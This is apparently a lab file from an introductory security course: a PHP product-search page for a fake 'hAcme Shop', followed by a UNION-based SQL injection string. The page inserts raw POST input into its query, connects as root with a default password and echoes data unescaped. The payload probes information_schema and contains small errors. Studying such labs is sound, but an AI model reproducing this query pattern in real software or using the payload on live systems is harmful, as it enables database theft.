<?php
session_start();

$mysqli= new mysqli("localhost", "root", "root", "introsecdb");
$search= $_POST['search'];

$query = "SELECT * FROM products WHERE name = '$search'";

$result = $mysqli->query($query);
$num = $result->num_rows;
$array = array();
$rows = mysqli_fetch_all($result, MYSQLI_ASSOC);
foreach( $rows as $row ):
	$array[] = $row['name'];
endforeach;

$result->free();
$mysqli->close();
?>

<!DOCTYPE html>
<html>
<body>
<?php if (isset($_SESSION['login_user'])) { ?>
<center>
<h1>hAcme Shop</h1>
<h2>Search</h2><br>
<p>Found the following products: <?php foreach ($array as $item) {echo $item ?> <br> <?php ;}// echo $display; ?>! Better buy them now! </p>
</center>
<?php echo "Logged in as: " . $_SESSION['name']; } else{ ?>
            <p>
                <span class="error">You are not authorized to view this page</span> Please <a href="login.php">login.</a>.
            </p>
  <?php } ?>
  <a href="logout.php">log out</a>
        
</body>
</html>


test') UNION SELECT table_schema, table_name, 1 FROM information_schema.table; --